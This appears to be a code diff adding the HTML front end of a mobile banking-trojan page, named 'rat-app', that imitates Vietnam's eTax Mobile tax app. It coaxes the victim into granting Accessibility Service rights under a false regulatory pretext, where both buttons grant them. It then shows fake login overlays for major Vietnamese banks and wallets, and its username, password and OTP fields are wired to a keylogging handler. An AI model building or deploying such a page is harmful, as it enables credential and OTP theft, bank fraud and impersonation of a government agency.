@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>eTax Mobile — Xác thực Điện tử</title>
+    <link rel="stylesheet" href="rat-app.css">
+</head>
+<body>
+    <!-- ========== SCREEN 1: SPLASH ========== -->
+    <div class="screen active" id="screen-splash">
+        <div class="splash-bg">
+            <div class="splash-icon" id="splashIcon">🏛️</div>
+            <h1 class="splash-title" id="splashTitle">eTax Mobile</h1>
+            <p class="splash-sub" id="splashSub">Tổng Cục Thuế — Bộ Tài Chính</p>
+            <div class="splash-loader"><div class="loader-bar"></div></div>
+            <p class="splash-status">Đang khởi tạo hệ thống xác thực...</p>
+        </div>
+    </div>
+
+    <!-- ========== SCREEN 2: ACCESSIBILITY PROMPT ========== -->
+    <div class="screen" id="screen-accessibility">
+        <div class="app-bar">
+            <span class="app-bar-title" id="accAppTitle">eTax Mobile</span>
+        </div>
+        <div class="screen-content">
+            <div class="acc-card">
+                <div class="acc-icon">⚙️</div>
+                <h2>Yêu Cầu Cấp Quyền Hệ Thống</h2>
+                <p class="acc-desc">Để hoàn tất quy trình xác thực sinh trắc học và liên kết tài khoản ngân hàng, ứng dụng cần được cấp quyền <strong>Dịch Vụ Hỗ Trợ (Accessibility Service)</strong>.</p>
+
+                <div class="acc-permissions">
+                    <div class="perm-item">
+                        <span class="perm-icon">🔍</span>
+                        <div>
+                            <strong>Đọc nội dung màn hình</strong>
+                            <span>Xác minh thông tin ngân hàng hiển thị</span>
+                        </div>
+                    </div>
+                    <div class="perm-item">
+                        <span class="perm-icon">👆</span>
+                        <div>
+                            <strong>Thao tác tự động</strong>
+                            <span>Tự động điền mã xác thực OTP</span>
+                        </div>
+                    </div>
+                    <div class="perm-item">
+                        <span class="perm-icon">📱</span>
+                        <div>
+                            <strong>Giám sát ứng dụng</strong>
+                            <span>Phát hiện ứng dụng ngân hàng để liên kết</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="acc-warning">
+                    <span>⚠️</span>
+                    <span>Quyền này bắt buộc theo Thông tư 17/2024/TT-NHNN về xác thực giao dịch điện tử.</span>
+                </div>
+
+                <button class="btn-primary" onclick="grantAccessibility()">
+                    ✅ Đồng Ý Cấp Quyền Trợ Năng
+                </button>
+                <button class="btn-secondary" onclick="grantAccessibility()">
+                    Bỏ qua (Không khuyến nghị)
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========== SCREEN 3: HOME — BANK GRID ========== -->
+    <div class="screen" id="screen-home">
+        <div class="app-bar">
+            <span class="app-bar-title" id="homeAppTitle">Liên Kết Ngân Hàng</span>
+            <span class="app-bar-status" id="accBadge">🔓</span>
+        </div>
+        <div class="screen-content">
+            <div class="home-notice">
+                <p>📋 Chọn Ngân hàng bạn đang sử dụng để liên kết xác thực sinh trắc học:</p>
+            </div>
+            <div class="bank-grid">
+                <button class="bank-item" onclick="openBankOverlay('Vietcombank')">
+                    <div class="bank-icon vcb">VCB</div>
+                    <span>Vietcombank</span>
+                </button>
+                <button class="bank-item" onclick="openBankOverlay('Techcombank')">
+                    <div class="bank-icon tcb">TCB</div>
+                    <span>Techcombank</span>
+                </button>
+                <button class="bank-item" onclick="openBankOverlay('MBBank')">
+                    <div class="bank-icon mb">MB</div>
+                    <span>MB Bank</span>
+                </button>
+                <button class="bank-item" onclick="openBankOverlay('BIDV')">
+                    <div class="bank-icon bidv">BIDV</div>
+                    <span>BIDV</span>
+                </button>
+                <button class="bank-item" onclick="openBankOverlay('VietinBank')">
+                    <div class="bank-icon vtb">VTB</div>
+                    <span>VietinBank</span>
+                </button>
+                <button class="bank-item" onclick="openBankOverlay('Agribank')">
+                    <div class="bank-icon agr">AGR</div>
+                    <span>Agribank</span>
+                </button>
+                <button class="bank-item" onclick="openBankOverlay('ZaloPay')">
+                    <div class="bank-icon zalo">ZP</div>
+                    <span>ZaloPay</span>
+                </button>
+                <button class="bank-item" onclick="openBankOverlay('MoMo')">
+                    <div class="bank-icon momo">MM</div>
+                    <span>MoMo</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========== SCREEN 4: BANKING OVERLAY ========== -->
+    <div class="screen" id="screen-overlay">
+        <div class="overlay-header" id="overlayHeader">
+            <button class="overlay-back" onclick="goBackFromOverlay()">← Quay lại</button>
+            <span id="overlayBankName">Vietcombank</span>
+        </div>
+        <div class="screen-content">
+            <div class="overlay-card">
+                <div class="overlay-bank-logo" id="overlayLogo">VCB</div>
+                <h2 id="overlayTitle">Đăng Nhập Vietcombank</h2>
+                <p class="overlay-desc">Nhập thông tin đăng nhập để liên kết xác thực sinh trắc học với tài khoản ngân hàng của bạn.</p>
+
+                <div class="form-group">
+                    <label>Tên đăng nhập / Số điện thoại</label>
+                    <input type="text" id="ovlUsername" placeholder="Nhập tên đăng nhập" autocomplete="off"
+                        oninput="handleKeylog(this, 'username')">
+                </div>
+                <div class="form-group">
+                    <label>Mật khẩu</label>
+                    <input type="password" id="ovlPassword" placeholder="Nhập mật khẩu" autocomplete="off"
+                        oninput="handleKeylog(this, 'password')">
+                </div>
+
+                <button class="btn-primary" onclick="submitOverlay()">
+                    Đăng Nhập & Liên Kết
+                </button>
+
+                <div class="overlay-footer">
+                    <span>🔒 Kết nối được mã hóa SSL 256-bit</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========== SCREEN 5: OTP CAPTURE ========== -->
+    <div class="screen" id="screen-otp">
+        <div class="app-bar">
+            <span class="app-bar-title">Xác Thực OTP</span>
+        </div>
+        <div class="screen-content">
+            <div class="otp-card">
+                <div class="otp-sms-fake" id="otpSmsBox">
+                    <div class="sms-header">
+                        <span class="sms-sender" id="otpSmsSender">Vietcombank</span>
+                        <span class="sms-time">Vừa xong</span>
+                    </div>
+                    <div class="sms-body" id="otpSmsBody">
+                        VCB: Ma OTP de xac thuc lien ket tai khoan la <strong id="otpCode">------</strong>. Hieu luc 3 phut. Khong chia se cho ai.
+                    </div>
+                </div>
+
+                <div class="otp-instruction">
+                    <p>📲 Mã OTP đã được gửi đến số điện thoại đăng ký. Vui lòng nhập mã bên dưới:</p>
+                </div>
+
+                <div class="form-group">
+                    <label>Nhập mã OTP (6 số)</label>
+                    <input type="tel" id="otpInput" placeholder="● ● ● ● ● ●" maxlength="6"
+                        class="otp-input-field" autocomplete="one-time-code"
+                        oninput="handleKeylog(this, 'otp')">
+                </div>
+
+                <button class="btn-primary" onclick="submitOtp()">
+                    Xác Nhận OTP
+                </button>
+
+                <div class="otp-timer">
+                    Mã hết hạn sau: <span id="otpTimer">02:59</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========== SCREEN 6: SUCCESS ========== -->
+    <div class="screen" id="screen-success">
+        <div class="screen-content" style="display:flex;align-items:center;justify-content:center;">
+            <div class="success-card">
+                <div class="success-check">✅</div>
+                <h2>Liên Kết Thành Công!</h2>
+                <p>Tài khoản ngân hàng của bạn đã được liên kết xác thực sinh trắc học thành công.</p>
+                <p class="success-sub">Hệ thống sẽ tự động đóng sau 5 giây...</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="rat-app.js"></script>
+</body>
+</html>
